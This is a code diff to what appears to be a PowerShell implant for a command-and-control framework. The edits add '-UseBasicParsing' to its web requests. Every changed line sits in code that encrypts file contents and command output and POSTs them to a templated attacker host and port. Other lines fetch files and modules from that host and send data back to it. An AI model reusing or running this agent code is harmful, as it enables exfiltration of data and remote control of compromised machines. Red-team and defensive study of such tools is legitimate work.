@@ -64,7 +64,7 @@ $file_content = Get-Content $File -Encoding Byte
 $content = enc -key $key -un $file_content -file 1
 
             $postParams = @{data=":$content`:"}
-            $re=Invoke-WebRequest -Uri {HTTP}://{ip}:{port}{image}?page=$agent -Method POST -Body $postParams
+            $re=Invoke-WebRequest -UseBasicParsing -Uri {HTTP}://{ip}:{port}{image}?page=$agent -Method POST -Body $postParams
 
 
 $final=[System.Convert]::FromBase64String($content)
@@ -90,7 +90,7 @@ return $output
 
 
             $postParams = @{f=$filename;d=$content}
-            $output=Invoke-WebRequest -Uri {HTTP}://{ip}:{port}{download}?page=$agent -Method POST -Body $postParams
+            $output=Invoke-WebRequest -UseBasicParsing -Uri {HTTP}://{ip}:{port}{download}?page=$agent -Method POST -Body $postParams
             #echo "returned $re.RawContent"
 
 
@@ -103,7 +103,7 @@ function up($filename){
 $filenameenc=enc -key $key -un $filename
 
 
-$re=Invoke-WebRequest -Uri {HTTP}://{ip}:{port}{upload}?page=$filenameenc -Method GET
+$re=Invoke-WebRequest -UseBasicParsing -Uri {HTTP}://{ip}:{port}{upload}?page=$filenameenc -Method GET
 
 $data=dec -key $key -enc $re.Content -file 1
 
@@ -117,7 +117,7 @@ echo $data | Set-Content $filename -Encoding Byte
 
             $modulename = enc -key $key -un $module
             $postParams = @{data=$modulename}
-            $re=Invoke-WebRequest -Uri {HTTP}://{ip}:{port}{md}?page=$agent -Method POST -Body $postParams
+            $re=Invoke-WebRequest -UseBasicParsing -Uri {HTTP}://{ip}:{port}{md}?page=$agent -Method POST -Body $postParams
             #echo "returned $re.RawContent"
             $modulecontent=dec -key $key -enc $re.Content
 
@@ -231,9 +231,8 @@ $redata=enc -key $key -un $output
 
 $postParams = @{data=$redata}
 
-$re=Invoke-WebRequest -Uri {HTTP}://{ip}:{port}{re}?page=$agent -Method POST -Body $postParams
-
-#$re = $wc3.UploadString("{HTTP}://{ip}:{port}{re}?page=$agent","data=$redata");
+$re=Invoke-WebRequest -UseBasicParsing -Uri {HTTP}://{ip}:{port}{re}?page=$agent -Method POST -Body $postParams
+$re=" "
 
 }
 }
